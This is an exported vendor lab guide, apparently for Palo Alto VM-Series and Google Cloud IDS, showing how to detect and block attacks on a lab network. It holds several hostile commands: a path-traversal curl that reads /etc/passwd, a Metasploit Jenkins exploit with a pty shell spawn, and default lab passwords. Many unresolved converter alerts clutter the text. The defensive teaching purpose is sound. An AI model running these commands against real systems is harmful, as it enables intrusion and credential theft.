<p style="color: red; font-weight: bold">>>>>>  gd2md-html alert:  ERRORs: 33; WARNINGs: 1; ALERTS: 37.</p>
<ul style="color: red; font-weight: bold"><li>See top comment block for details on ERRORs and WARNINGs. <li>In the converted Markdown or HTML, search for inline alerts that start with >>>>>  gd2md-html alert:  for specific instances that need correction.</ul>

<p style="color: red; font-weight: bold">Links to alert messages:</p><a href="#gdcalert1">alert1</a>
<a href="#gdcalert2">alert2</a>
<a href="#gdcalert3">alert3</a>
<a href="#gdcalert4">alert4</a>
<a href="#gdcalert5">alert5</a>
<a href="#gdcalert6">alert6</a>
<a href="#gdcalert7">alert7</a>
<a href="#gdcalert8">alert8</a>
<a href="#gdcalert9">alert9</a>
<a href="#gdcalert10">alert10</a>
<a href="#gdcalert11">alert11</a>
<a href="#gdcalert12">alert12</a>
<a href="#gdcalert13">alert13</a>
<a href="#gdcalert14">alert14</a>
<a href="#gdcalert15">alert15</a>
<a href="#gdcalert16">alert16</a>
<a href="#gdcalert17">alert17</a>
<a href="#gdcalert18">alert18</a>
<a href="#gdcalert19">alert19</a>
<a href="#gdcalert20">alert20</a>
<a href="#gdcalert21">alert21</a>
<a href="#gdcalert22">alert22</a>
<a href="#gdcalert23">alert23</a>
<a href="#gdcalert24">alert24</a>
<a href="#gdcalert25">alert25</a>
<a href="#gdcalert26">alert26</a>
<a href="#gdcalert27">alert27</a>
<a href="#gdcalert28">alert28</a>
<a href="#gdcalert29">alert29</a>
<a href="#gdcalert30">alert30</a>
<a href="#gdcalert31">alert31</a>
<a href="#gdcalert32">alert32</a>
<a href="#gdcalert33">alert33</a>
<a href="#gdcalert34">alert34</a>
<a href="#gdcalert35">alert35</a>
<a href="#gdcalert36">alert36</a>
<a href="#gdcalert37">alert37</a>

<p style="color: red; font-weight: bold">>>>>> PLEASE check and correct alert issues and delete this message and the inline alerts.<hr></p>



# Enhanced Layered Network Security Approach for Google Cloud


# Overview

In this lab you will use the Palo Alto Networks VM-Series ML-NGFW and Google Cloud IDS to provide a layered security approach for a Google Cloud VPC network.

The VM-Series firewall is the virtualized form factor of the Palo Alto Networks next-generation firewall. It is positioned for use in cloud environments where it can protect and secure east-west and north-south traffic.

Google Cloud IDS (Cloud Intrusion Detection System) is a cloud-native network threat detection system powered by Palo Alto Networks industry-leading security technologies.   Cloud IDS provides threat detection for intrusions, malware, spyware, and command-and-control attacks for your Google Cloud network.  It works by peering your network to a Google-managed network. Traffic in the peered network is mirrored, and then inspected by Palo Alto Networks technologies to provide advanced threat detection. You can mirror all traffic or you can mirror filtered traffic, based on protocol, IP address range, or flow directionality. 

In this lab, you will use the VM-Series firewall to provide north-south threat prevention for a Google VPC network.  For traffic moving laterally (east-west) across the network, you will leverage Google Cloud IDS to provide advanced threat detection. 


## Lab Objectives 



* Review Google Cloud IDS and VM-Series ML-NGFW topology
* Build the lab environment using Terraform by Hashicorp
* Run a variety of attacks from outside and inside the protected Google VPC network.
* Prevent north/south threats with the VM-Series ML-NGFW.
* Detect east/west threats with Google Cloud IDS.


## Topology

The VM-Series firewall, Google Cloud IDS, Jenkins Server, Juice Shop web server and Kali Linux server will be deployed and configured with Terraform.  From a traffic flow perspective, the green line represents intra-VPC traffic (east/west traffic).  All intra-VPC traffic will be mirrored to the Google Cloud IDS service.  The red line represents inter-VPC traffic (north/south traffic).  All inter-VPC traffic will be routed to the VM-Series ML-NGFW for in-line prevention.  Please note, the log collection and SIEM/SOAR technologies listed in the diagram are not covered in this lab. 

![alt_text](https://raw.githubusercontent.com/wwce/gcp-tf-cloud-ids-lab/0ae6302a0f7a146c596223589339312dc7690618/images/image1.png "image_tooltip")



# Build the Lab Environment

In this section, we will walk through how to deploy the environment using Terraform. Please note, after the Terraform build completes, the virtual machines may take an additional 10 minutes to finish their boot-up process.



1. Open Google Cloud Shell by clicking the shell icon in the top right hand corner.

![alt_text](https://raw.githubusercontent.com/wwce/gcp-tf-cloud-ids-lab/0ae6302a0f7a146c596223589339312dc7690618/images/image2.png "image_tooltip")




1. In cloud shell, copy and paste the following commands to clone the repository and to apply the Terraform plan.

    ```
git clone https://github.com/wwce/gcp-tf-cloud-ids-lab
cd gcp-tf-cloud-ids-lab
terraform init
terraform apply
```


3. Verify that the Terraform plan will create 26 resources. Enter `yes` to start the build.



<p id="gdcalert3" ><span style="color: red; font-weight: bold">>>>>>  gd2md-html alert: error handling inline image </span><br>(<a href="#">Back to top</a>)(<a href="#gdcalert4">Next alert</a>)<br><span style="color: red; font-weight: bold">>>>>> </span></p>





4. Once the build completes, the following output will be generated.  



<p id="gdcalert4" ><span style="color: red; font-weight: bold">>>>>>  gd2md-html alert: error handling inline image </span><br>(<a href="#">Back to top</a>)(<a href="#gdcalert5">Next alert</a>)<br><span style="color: red; font-weight: bold">>>>>> </span></p>




# Verify Build Completion 



1. The virtual machines in this lab can take up to 10 minutes to finish their deployment.  
2. To verify the VMs are ready, copy and paste the `URL_juiceshop` output value into a web browser.
3. Once you receive the Juice Shop web page successfully, please proceed to the next part of this lab. 



<p id="gdcalert5" ><span style="color: red; font-weight: bold">>>>>>  gd2md-html alert: error handling inline image </span><br>(<a href="#">Back to top</a>)(<a href="#gdcalert6">Next alert</a>)<br><span style="color: red; font-weight: bold">>>>>> </span></p>




# VM-Series Threat Prevention 

In this section of the lab, we will simulate several threats to test the VM-Series threat prevention capabilities for north/south traffic flows.  The first threat is a simple curl command to retrieve the passwords file from a vulnerable Jenkins server.  The second threat is an attempt to download a malicious internet file from an internal Google VM.  Both of these traffic flows traverse through the VM-Series firewall for north-south inspection. 


```
Tip! You can redisplay your Terraform outputs at anytime by running terraform output from the gcp-tf-cloud-ids-lab directory. 
```



##  Launch Inbound Threat



1. Copy and paste the `URL_attacker` output value into Cloud Shell.  This command will attempt to retrieve the passwords file from a vulnerable web application. 



<p id="gdcalert6" ><span style="color: red; font-weight: bold">>>>>>  gd2md-html alert: error handling inline image </span><br>(<a href="#">Back to top</a>)(<a href="#gdcalert7">Next alert</a>)<br><span style="color: red; font-weight: bold">>>>>> </span></p>




    (Output)


```
curl: (56) Recv failure: Connection reset by peer
```



    The request should fail.  This is because the VM-Series is preventing high risk vulnerabilities through its content inspection engine. 


## Launch Outbound Threat



1. Copy and paste the `SSH_attacker` output value into Cloud Shell.  This opens a SSH session to the attacker VM (Kali Linux) that runs behind the VM-Series firewall in the shared VPC network.



<p id="gdcalert7" ><span style="color: red; font-weight: bold">>>>>>  gd2md-html alert: error handling inline image </span><br>(<a href="#">Back to top</a>)(<a href="#gdcalert8">Next alert</a>)<br><span style="color: red; font-weight: bold">>>>>> </span></p>




```
Password: kali
```




4. Run the following command to attempt to download a sudo-malicious file from the internet.  

    ```
wget www.eicar.org/download/eicar.com.txt
```



(Output)



<p id="gdcalert8" ><span style="color: red; font-weight: bold">>>>>>  gd2md-html alert: error handling inline image </span><br>(<a href="#">Back to top</a>)(<a href="#gdcalert9">Next alert</a>)<br><span style="color: red; font-weight: bold">>>>>> </span></p>




    The download request should fail.  This is because the VM-Series is preventing malicious file downloads through its content inspection engine. 


## View Threats on VM-Series

In this section, we will observe the action taken by the VM-Series on the threats attempted in the previous section of this lab. 



1. Copy and paste the `URL_vmseries` output value into Cloud Shell.  This URL brings you to the management interface of the VM-Series ML-NGFW.



<p id="gdcalert9" ><span style="color: red; font-weight: bold">>>>>>  gd2md-html alert: error handling inline image </span><br>(<a href="#">Back to top</a>)(<a href="#gdcalert10">Next alert</a>)<br><span style="color: red; font-weight: bold">>>>>> </span></p>





2. Log into the VM-Series with the following credentials

    ```
Username: admin
Password: Pal0Alt0@123
```


3. Navigate to **Monitor → Threat**



<p id="gdcalert10" ><span style="color: red; font-weight: bold">>>>>>  gd2md-html alert: inline image link here (to images/image3.png). Store image on your image server and adjust path/filename/extension if necessary. </span><br>(<a href="#">Back to top</a>)(<a href="#gdcalert11">Next alert</a>)<br><span style="color: red; font-weight: bold">>>>>> </span></p>


![alt_text](images/image3.png "image_tooltip")




4. The threat logs should show the previous inbound and outbound threat attempts. You can click the magnify glass next to any of the logs to view more information. 



<p id="gdcalert11" ><span style="color: red; font-weight: bold">>>>>>  gd2md-html alert: error handling inline image </span><br>(<a href="#">Back to top</a>)(<a href="#gdcalert12">Next alert</a>)<br><span style="color: red; font-weight: bold">>>>>> </span></p>





5. The detailed view of a threat log shows a variety of information, including:  threat severity, filename, file type, application, source/destination country, user, and more. 



<p id="gdcalert12" ><span style="color: red; font-weight: bold">>>>>>  gd2md-html alert: error handling inline image </span><br>(<a href="#">Back to top</a>)(<a href="#gdcalert13">Next alert</a>)<br><span style="color: red; font-weight: bold">>>>>> </span></p>

 


# Google Cloud IDS

In this section, we will launch an exploit from our attacker VM to a Jenkins server that reside in the same VPC network.  The VM-Series will not be in-line with this traffic, so we will use Google Cloud IDS to provide advanced threat detection to alert on any observed threats. 


## Attach Traffic Mirror Policy



1. In the Google Cloud console, navigate to **Network Security → Cloud IDS**



<p id="gdcalert13" ><span style="color: red; font-weight: bold">>>>>>  gd2md-html alert: error handling inline image </span><br>(<a href="#">Back to top</a>)(<a href="#gdcalert14">Next alert</a>)<br><span style="color: red; font-weight: bold">>>>>> </span></p>





2. Click **Endpoints**.  You will see an existing Cloud IDS Endpoint created by the Terraform build (xxxx-ids-endpoint).  



<p id="gdcalert14" ><span style="color: red; font-weight: bold">>>>>>  gd2md-html alert: error handling inline image </span><br>(<a href="#">Back to top</a>)(<a href="#gdcalert15">Next alert</a>)<br><span style="color: red; font-weight: bold">>>>>> </span></p>




```
If your endpoint shows the "cycling" icon, please wait until the endpoint finishes creating.
```




3. A packet mirroring policy needs to be attached to the endpoint to mirror packets to Cloud IDS.  Click **Endpoints → ATTACH**



<p id="gdcalert15" ><span style="color: red; font-weight: bold">>>>>>  gd2md-html alert: error handling inline image </span><br>(<a href="#">Back to top</a>)(<a href="#gdcalert16">Next alert</a>)<br><span style="color: red; font-weight: bold">>>>>> </span></p>





4. Create the packet mirroring policy as follows.



<p id="gdcalert16" ><span style="color: red; font-weight: bold">>>>>>  gd2md-html alert: error handling inline image </span><br>(<a href="#">Back to top</a>)(<a href="#gdcalert17">Next alert</a>)<br><span style="color: red; font-weight: bold">>>>>> </span></p>





<p id="gdcalert17" ><span style="color: red; font-weight: bold">>>>>>  gd2md-html alert: error handling inline image </span><br>(<a href="#">Back to top</a>)(<a href="#gdcalert18">Next alert</a>)<br><span style="color: red; font-weight: bold">>>>>> </span></p>





<p id="gdcalert18" ><span style="color: red; font-weight: bold">>>>>>  gd2md-html alert: error handling inline image </span><br>(<a href="#">Back to top</a>)(<a href="#gdcalert19">Next alert</a>)<br><span style="color: red; font-weight: bold">>>>>> </span></p>





<p id="gdcalert19" ><span style="color: red; font-weight: bold">>>>>>  gd2md-html alert: inline image link here (to images/image4.png). Store image on your image server and adjust path/filename/extension if necessary. </span><br>(<a href="#">Back to top</a>)(<a href="#gdcalert20">Next alert</a>)<br><span style="color: red; font-weight: bold">>>>>> </span></p>


![alt_text](images/image4.png "image_tooltip")



## Launch East-West Threat



1. Log into the attacker VM from the previous section of the lab.



<p id="gdcalert20" ><span style="color: red; font-weight: bold">>>>>>  gd2md-html alert: error handling inline image </span><br>(<a href="#">Back to top</a>)(<a href="#gdcalert21">Next alert</a>)<br><span style="color: red; font-weight: bold">>>>>> </span></p>




```
Password: kali
```




2. Run the command to pull the passwords file from the jenkins server. 

    ```
curl http://192.168.11.2/cgi-bin/../../../..//bin/cat%20/etc/passwd
```



(Output)



<p id="gdcalert21" ><span style="color: red; font-weight: bold">>>>>>  gd2md-html alert: error handling inline image </span><br>(<a href="#">Back to top</a>)(<a href="#gdcalert22">Next alert</a>)<br><span style="color: red; font-weight: bold">>>>>> </span></p>





3. Run the following command to run a full exploit against the jenkins server. 

    ```
msfconsole -r jenkins.rc
```



(Output)



<p id="gdcalert22" ><span style="color: red; font-weight: bold">>>>>>  gd2md-html alert: error handling inline image </span><br>(<a href="#">Back to top</a>)(<a href="#gdcalert23">Next alert</a>)<br><span style="color: red; font-weight: bold">>>>>> </span></p>




```
If the exploit fails, please reboot the Jenkins server (Compute Engine → VM Instances) and retry 
the exploit.
```




4. Enter the command to access the shell of Jenkins server:

    ```
python -c 'import pty; pty.spawn("/bin/bash")'
```



(Output)



<p id="gdcalert23" ><span style="color: red; font-weight: bold">>>>>>  gd2md-html alert: error handling inline image </span><br>(<a href="#">Back to top</a>)(<a href="#gdcalert24">Next alert</a>)<br><span style="color: red; font-weight: bold">>>>>> </span></p>





5. You are now logged into the Jenkins server via reverse tunnel. Check which account you’re using:

    ```
whoami
```



(Output)



<p id="gdcalert24" ><span style="color: red; font-weight: bold">>>>>>  gd2md-html alert: error handling inline image </span><br>(<a href="#">Back to top</a>)(<a href="#gdcalert25">Next alert</a>)<br><span style="color: red; font-weight: bold">>>>>> </span></p>





6. Examine the session established by the exploit:

    ```
netstat -an
```



(Output)



<p id="gdcalert25" ><span style="color: red; font-weight: bold">>>>>>  gd2md-html alert: error handling inline image </span><br>(<a href="#">Back to top</a>)(<a href="#gdcalert26">Next alert</a>)<br><span style="color: red; font-weight: bold">>>>>> </span></p>





7. Review the processes associated with the exploit:

    ```
ps -ef
ps -aux
```



(Output)



<p id="gdcalert26" ><span style="color: red; font-weight: bold">>>>>>  gd2md-html alert: error handling inline image </span><br>(<a href="#">Back to top</a>)(<a href="#gdcalert27">Next alert</a>)<br><span style="color: red; font-weight: bold">>>>>> </span></p>





5. You have the access to the `etc/passwd` file:

    ```
head /etc/passwd
```



(Output)



<p id="gdcalert27" ><span style="color: red; font-weight: bold">>>>>>  gd2md-html alert: error handling inline image </span><br>(<a href="#">Back to top</a>)(<a href="#gdcalert28">Next alert</a>)<br><span style="color: red; font-weight: bold">>>>>> </span></p>





6. Type `exit` and `exit` to return to the Kali linux prompt.

(Output)



<p id="gdcalert28" ><span style="color: red; font-weight: bold">>>>>>  gd2md-html alert: error handling inline image </span><br>(<a href="#">Back to top</a>)(<a href="#gdcalert29">Next alert</a>)<br><span style="color: red; font-weight: bold">>>>>> </span></p>




## View Threats on Cloud IDS



1. Go to the Google Cloud Console.  Click **THREATS** within the Google Cloud IDS dashboard. 



<p id="gdcalert29" ><span style="color: red; font-weight: bold">>>>>>  gd2md-html alert: error handling inline image </span><br>(<a href="#">Back to top</a>)(<a href="#gdcalert30">Next alert</a>)<br><span style="color: red; font-weight: bold">>>>>> </span></p>





2. You should have a handful of alerts from the previously launched threats.  These threats appear because the VPC network is mirroring traffic to the Cloud IDS service for further inspection.



<p id="gdcalert30" ><span style="color: red; font-weight: bold">>>>>>  gd2md-html alert: error handling inline image </span><br>(<a href="#">Back to top</a>)(<a href="#gdcalert31">Next alert</a>)<br><span style="color: red; font-weight: bold">>>>>> </span></p>




## View Cloud IDS Traffic Logs

Cloud IDS can also ingest all traffic logs from the VPC network.  This enables you to gain visibility into application traffic via Layer-7 inspection, details on source and destination addresses, repeat count, threat type, and more.   In this section, we will demonstrate how to view these logs. 



1. In the Google Cloud console, navigate to **Network Security → Cloud IDS**



<p id="gdcalert31" ><span style="color: red; font-weight: bold">>>>>>  gd2md-html alert: error handling inline image </span><br>(<a href="#">Back to top</a>)(<a href="#gdcalert32">Next alert</a>)<br><span style="color: red; font-weight: bold">>>>>> </span></p>





2. Click **Endpoints** and click the name of your Cloud IDS endpoint. 



<p id="gdcalert32" ><span style="color: red; font-weight: bold">>>>>>  gd2md-html alert: error handling inline image </span><br>(<a href="#">Back to top</a>)(<a href="#gdcalert33">Next alert</a>)<br><span style="color: red; font-weight: bold">>>>>> </span></p>





3. Click **View related logs**.  This will bring you to Log Explorer. 



<p id="gdcalert33" ><span style="color: red; font-weight: bold">>>>>>  gd2md-html alert: error handling inline image </span><br>(<a href="#">Back to top</a>)(<a href="#gdcalert34">Next alert</a>)<br><span style="color: red; font-weight: bold">>>>>> </span></p>





4. You can adjust the query within Log Explorer to show an infinite number of results.  The pre-populated filter is displaying threats seen by your Cloud IDS endpoint within the us-east1-b zone.
5. Click **Clear query**.  



<p id="gdcalert34" ><span style="color: red; font-weight: bold">>>>>>  gd2md-html alert: error handling inline image </span><br>(<a href="#">Back to top</a>)(<a href="#gdcalert35">Next alert</a>)<br><span style="color: red; font-weight: bold">>>>>> </span></p>





6. Paste the string below into the Query Builder.  

    ```
resource.type:("ids.googleapis.com/Endpoint") AND resource.labels.location:("us-east1-b")

jsonPayload.application="web-browsing"
```





<p id="gdcalert35" ><span style="color: red; font-weight: bold">>>>>>  gd2md-html alert: error handling inline image </span><br>(<a href="#">Back to top</a>)(<a href="#gdcalert36">Next alert</a>)<br><span style="color: red; font-weight: bold">>>>>> </span></p>





7. Click **Run query** to search for results.
8. The query enter results in all generic web-browsing activity from the VM resources.  Feel free to open any of the results to  see more information. 
9. To look for more specific traffic, in the Query builder change the jsonPayload.application from web-browsing to apt-get. 

 


```
resource.type:("ids.googleapis.com/Endpoint") AND resource.labels.location:("us-east1-b")

jsonPayload.application="apt-get"
```




<p id="gdcalert36" ><span style="color: red; font-weight: bold">>>>>>  gd2md-html alert: error handling inline image </span><br>(<a href="#">Back to top</a>)(<a href="#gdcalert37">Next alert</a>)<br><span style="color: red; font-weight: bold">>>>>> </span></p>





10. The result shows all log activity for traffic using apt-get.  Cloud IDS is capable of identifying applications with Palo Alto Networks layer 7 inspection technologies. 



<p id="gdcalert37" ><span style="color: red; font-weight: bold">>>>>>  gd2md-html alert: error handling inline image </span><br>(<a href="#">Back to top</a>)(<a href="#gdcalert38">Next alert</a>)<br><span style="color: red; font-weight: bold">>>>>> </span></p>




# Congratulations

You have completed the lab!  You have demonstrated the value of implementing Palo Alto Networks VM-Series ML-NGFW to prevent threats towards a Google VPC network.  You have also demonstrated the value of implementing Google CLoud IDS to detect advanced threats across Google networks.  